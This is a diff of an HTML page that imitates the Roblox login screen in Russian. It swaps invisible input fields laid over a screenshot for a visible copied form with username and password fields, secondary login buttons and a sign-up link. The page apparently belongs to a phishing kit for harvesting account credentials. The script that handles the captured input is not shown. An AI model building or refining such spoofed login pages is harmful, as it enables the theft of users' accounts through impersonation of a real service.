@@ -11,25 +11,31 @@
     <!-- Твой скриншот на весь экран -->
     <img src="bg.jpg" class="fullscreen-bg" alt="bg">
 
-    <!-- Контейнер, который мы накладываем ровно поверх картинки -->
-    <div class="overlay-container">
+    <div class="login-container">
+        <h1>Войти в Roblox</h1>
         
-        <form id="loginForm">
-            <!-- Поля ввода -->
-            <input type="text" id="username" class="invisible-input" placeholder="" required autocomplete="off">
-            <input type="password" id="password" class="invisible-input" placeholder="" required autocomplete="new-password">
-            
-            <!-- Кнопка входа -->
-            <button type="submit" class="invisible-btn"></button>
+        <!-- autocomplete="off" и new-password отключают навязчивые окна Google -->
+        <form id="loginForm" autocomplete="off">
+            <input type="text" id="username" name="login_username" placeholder="Имя пользователя/Электронная почта/Телефон" required autocomplete="off">
+            <input type="password" id="password" name="login_password" placeholder="Пароль" required autocomplete="new-password">
+            <button type="submit" class="login-btn">Авторизоваться</button>
         </form>
 
-        <!-- Кликабельные зоны для остальных кнопок (чтобы курсор менялся) -->
-        <a href="#" class="clickable-zone zone-forgot"></a>
-        <a href="#" class="clickable-zone zone-email"></a>
-        <a href="#" class="clickable-zone zone-quick"></a>
-        <a href="#" class="clickable-zone zone-other"></a>
-        <a href="#" class="clickable-zone zone-signup"></a>
+        <div class="forgot-password">
+            <a href="#">Забыли пароль или имя пользователя?</a>
+        </div>
 
+        <div class="divider"></div>
+
+        <div class="login-options">
+            <button class="secondary-btn">Отправить мне одноразовый код по электронной почте</button>
+            <button class="secondary-btn">Быстрый вход</button>
+            <button class="secondary-btn">Другие варианты входа в систему</button>
+        </div>
+
+        <div class="footer-text">
+            У вас нет аккаунта? <a href="#">Зарегистрируйтесь</a>
+        </div>
     </div>
 
     <script src="script.js"></script>
